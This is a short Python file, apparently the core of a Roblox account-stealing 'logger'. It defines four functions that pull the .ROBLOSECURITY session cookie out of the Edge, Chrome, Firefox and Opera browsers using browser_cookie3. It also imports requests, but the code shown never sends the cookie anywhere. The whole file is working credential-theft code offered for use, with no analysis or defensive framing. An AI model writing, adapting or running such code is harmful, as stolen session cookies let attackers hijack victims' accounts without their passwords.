import requests
import browser_cookie3


def edge_logger():
    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(
            ' for .roblox.com/>')[0].strip()
        return cookie
    except:
        return None


def chrome_logger():
    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(
            ' for .roblox.com/>')[0].strip()
        return cookie
    except:
        return None


def firefox_logger():
    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(
            ' for .roblox.com/>')[0].strip()
        return cookie
    except:
        return None


def opera_logger():
    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(
            ' for .roblox.com/>')[0].strip()
        return cookie
    except:
        return None
